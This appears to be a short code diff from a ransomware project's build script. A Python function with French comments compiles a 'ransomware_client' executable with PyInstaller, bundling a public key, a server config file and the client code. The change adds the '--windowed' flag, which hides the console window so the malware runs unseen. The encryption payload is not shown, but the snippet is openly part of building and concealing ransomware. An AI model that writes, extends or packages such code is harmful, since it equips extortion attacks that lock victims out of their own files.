@@ -79,7 +79,7 @@ def compile_executable():
 
     # Compiler l'exécutable avec PyInstaller
     process = subprocess.Popen([
-        'pyinstaller', '--onefile', '--name=ransomware_client',
+        'pyinstaller', '--onefile', '--windowed', '--name=ransomware_client',
         '--add-data', 'keys/public_key.pem:keys',
         '--add-data', 'server/config.ini:server',
         '--add-data', 'client:client',  # Inclure tout le répertoire client
